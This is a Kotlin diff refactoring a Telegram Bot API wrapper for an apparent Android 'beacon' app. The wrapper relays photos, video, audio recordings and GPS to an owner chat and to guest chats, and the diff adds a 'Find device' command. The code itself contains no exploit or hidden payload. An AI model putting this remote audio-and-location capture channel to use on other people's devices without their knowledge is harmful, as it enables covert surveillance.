@@ -8,20 +8,26 @@ import java.io.File
 import java.net.HttpURLConnection
 import java.net.URL
 
-/**
- * Telegram Bot API wrapper.
- * All calls are synchronous — wrap in Thread{} at call site.
- */
 class TelegramSender(private val prefs: SharedPreferences) {
 
-    private val token  get() = prefs.getString(Config.KEY_BOT_TOKEN, "") ?: ""
-    private val chatId get() = prefs.getString(Config.KEY_CHAT_ID,   "") ?: ""
+    private val token      get() = prefs.getString(Config.KEY_BOT_TOKEN, "") ?: ""
+    private val ownerChatId get() = prefs.getString(Config.KEY_CHAT_ID,   "") ?: ""
 
     // =========================================================================
-    // Public send API
+    // Send to OWNER (beacon's configured chat)
     // =========================================================================
 
-    fun sendMessage(text: String, keyboard: JSONArray? = null) {
+    fun sendMessageToOwner(text: String, keyboard: JSONArray? = null) =
+        sendToChat(ownerChatId, text, keyboard)
+
+    fun sendPhotoToOwner(file: File, caption: String = "") =
+        sendPhotoToChat(ownerChatId, file, caption)
+
+    // =========================================================================
+    // Send to SPECIFIC chat (used for guest sessions)
+    // =========================================================================
+
+    fun sendToChat(chatId: String, text: String, keyboard: JSONArray? = null) {
         if (token.isBlank() || chatId.isBlank()) return
         Thread {
             try {
@@ -34,54 +40,54 @@ class TelegramSender(private val prefs: SharedPreferences) {
                         put("reply_markup", JSONObject().put("inline_keyboard", keyboard))
                 }.toString()
                 post("sendMessage", body.toByteArray(), "application/json")
-            } catch (e: Exception) {
-                Log.e("TG", "sendMessage failed", e)
-            }
+            } catch (e: Exception) { Log.e("TG", "sendMessage failed", e) }
         }.start()
     }
 
-    fun sendPhoto(file: File, caption: String = "") =
-        sendFile("sendPhoto", "photo", "photo.jpg", "image/jpeg", file, caption)
+    fun sendPhotoToChat(chatId: String, file: File, caption: String = "") =
+        sendFile(chatId, "sendPhoto", "photo", "photo.jpg", "image/jpeg", file, caption)
 
-    fun sendVideo(file: File, caption: String = "") =
-        sendFile("sendVideo", "video", "video.mp4", "video/mp4", file, caption, readTimeout = 60_000)
+    fun sendVideoToChat(chatId: String, file: File, caption: String = "") =
+        sendFile(chatId, "sendVideo", "video", "video.mp4", "video/mp4", file, caption, readTimeout = 60_000)
 
-    fun sendAudio(file: File, caption: String = "") =
-        sendFile("sendAudio", "audio", "audio.m4a", "audio/mp4", file, caption)
+    fun sendAudioToChat(chatId: String, file: File, caption: String = "") =
+        sendFile(chatId, "sendAudio", "audio", "audio.m4a", "audio/mp4", file, caption)
 
-    /** Must be called from background thread. */
+    // Keep old names as convenience wrappers for owner
+    fun sendPhoto(file: File, caption: String = "") = sendPhotoToOwner(file, caption)
+
+    // =========================================================================
+    // getUpdates / answerCallback
+    // =========================================================================
+
     fun getUpdates(offset: Long): List<Update> {
         if (token.isBlank()) return emptyList()
         return try {
             val url = URL("https://api.telegram.org/bot$token/getUpdates?offset=$offset&limit=20&timeout=0")
             val conn = (url.openConnection() as HttpURLConnection).apply {
-                connectTimeout = 10_000
-                readTimeout    = 10_000
+                connectTimeout = 10_000; readTimeout = 10_000
             }
             val json = conn.inputStream.bufferedReader().readText()
             conn.disconnect()
             parseUpdates(json)
         } catch (e: Exception) {
-            Log.e("TG", "getUpdates failed", e)
-            emptyList()
+            Log.e("TG", "getUpdates failed", e); emptyList()
         }
     }
 
-    /** Acknowledge a callback_query so Telegram removes the loading spinner. */
     fun answerCallback(callbackQueryId: String) {
         if (token.isBlank()) return
         Thread {
             try {
-                val body = JSONObject().put("callback_query_id", callbackQueryId).toString()
-                post("answerCallbackQuery", body.toByteArray(), "application/json")
-            } catch (e: Exception) {
-                Log.e("TG", "answerCallback failed", e)
-            }
+                post("answerCallbackQuery",
+                    JSONObject().put("callback_query_id", callbackQueryId).toString().toByteArray(),
+                    "application/json")
+            } catch (e: Exception) { Log.e("TG", "answerCallback failed", e) }
         }.start()
     }
 
     // =========================================================================
-    // Inline keyboard builder (static)
+    // Keyboard builder
     // =========================================================================
 
     companion object {
@@ -102,7 +108,7 @@ class TelegramSender(private val prefs: SharedPreferences) {
                     put(btn("🎙 Audio 10s", "/audio"))
                     put(btn("📍 GPS", "/gps"))
                 })
-                put(JSONArray().apply {             // audio duration options
+                put(JSONArray().apply {
                     put(btn("🎙 30s", "/audio 30"))
                     put(btn("🎙 60s", "/audio 60"))
                     put(btn("🎙 120s", "/audio 120"))
@@ -117,6 +123,7 @@ class TelegramSender(private val prefs: SharedPreferences) {
                     }
                 })
                 put(JSONArray().apply {
+                    put(btn("🔍 Find device", "/find"))
                     put(btn("📊 Status", "/status"))
                     put(btn("❓ Help", "/help"))
                 })
@@ -125,29 +132,23 @@ class TelegramSender(private val prefs: SharedPreferences) {
     }
 
     // =========================================================================
-    // Private helpers
+    // Private
     // =========================================================================
 
     private fun sendFile(
-        method: String,
-        fieldName: String,
-        fileName: String,
-        mimeType: String,
-        file: File,
-        caption: String = "",
-        readTimeout: Int = 30_000
+        chatId: String, method: String, fieldName: String,
+        fileName: String, mimeType: String, file: File,
+        caption: String = "", readTimeout: Int = 30_000
     ) {
         if (token.isBlank() || chatId.isBlank()) return
         Thread {
             try {
                 val boundary = "----Boundary${System.currentTimeMillis()}"
-                val url = URL("https://api.telegram.org/bot$token/$method")
-                val conn = (url.openConnection() as HttpURLConnection).apply {
+                val conn = (URL("https://api.telegram.org/bot$token/$method")
+                    .openConnection() as HttpURLConnection).apply {
                     requestMethod = "POST"
                     setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
-                    doOutput = true
-                    connectTimeout = 15_000
-                    this.readTimeout = readTimeout
+                    doOutput = true; connectTimeout = 15_000; this.readTimeout = readTimeout
                 }
                 conn.outputStream.use { os ->
                     fun textPart(name: String, value: String) {
@@ -170,29 +171,22 @@ class TelegramSender(private val prefs: SharedPreferences) {
                     os.flush()
                 }
                 val code = conn.responseCode
-                if (code != 200) {
-                    val err = conn.errorStream?.bufferedReader()?.readText() ?: ""
-                    Log.w("TG", "$method HTTP $code: $err")
-                }
+                if (code != 200)
+                    Log.w("TG", "$method HTTP $code: ${conn.errorStream?.bufferedReader()?.readText()}")
                 conn.disconnect()
-            } catch (e: Exception) {
-                Log.e("TG", "$method failed", e)
-            }
+            } catch (e: Exception) { Log.e("TG", "$method failed", e) }
         }.start()
     }
 
     private fun post(method: String, body: ByteArray, contentType: String) {
-        val url = URL("https://api.telegram.org/bot$token/$method")
-        val conn = (url.openConnection() as HttpURLConnection).apply {
+        val conn = (URL("https://api.telegram.org/bot$token/$method")
+            .openConnection() as HttpURLConnection).apply {
             requestMethod = "POST"
             setRequestProperty("Content-Type", contentType)
-            doOutput = true
-            connectTimeout = 15_000
-            readTimeout    = 15_000
+            doOutput = true; connectTimeout = 15_000; readTimeout = 15_000
         }
         conn.outputStream.use { it.write(body) }
-        val code = conn.responseCode
-        if (code != 200) Log.w("TG", "$method HTTP $code")
+        if (conn.responseCode != 200) Log.w("TG", "$method HTTP ${conn.responseCode}")
         conn.disconnect()
     }
 
@@ -205,38 +199,31 @@ class TelegramSender(private val prefs: SharedPreferences) {
             for (i in 0 until arr.length()) {
                 val upd      = arr.getJSONObject(i)
                 val updateId = upd.getLong("update_id")
-
-                // Regular text message
-                val message = upd.optJSONObject("message")
+                val message  = upd.optJSONObject("message")
                 if (message != null) {
                     val text   = message.optString("text", "").trim()
                     val fromId = message.optJSONObject("from")?.optLong("id") ?: 0L
                     if (text.isNotEmpty())
-                        result.add(Update(updateId, text, fromId, callbackQueryId = null))
+                        result.add(Update(updateId, text, fromId, null))
                     continue
                 }
-
-                // Inline keyboard button press
                 val cq = upd.optJSONObject("callback_query")
                 if (cq != null) {
                     val data   = cq.optString("data", "").trim()
                     val fromId = cq.optJSONObject("from")?.optLong("id") ?: 0L
                     val cqId   = cq.optString("id", "")
                     if (data.isNotEmpty())
-                        result.add(Update(updateId, data, fromId, callbackQueryId = cqId))
+                        result.add(Update(updateId, data, fromId, cqId))
                 }
             }
             result
         } catch (e: Exception) {
-            Log.e("TG", "parseUpdates failed", e)
-            result
+            Log.e("TG", "parseUpdates failed", e); result
         }
     }
 
     data class Update(
-        val updateId: Long,
-        val text: String,
-        val fromId: Long,
-        val callbackQueryId: String?
+        val updateId: Long, val text: String,
+        val fromId: Long, val callbackQueryId: String?
     )
 }
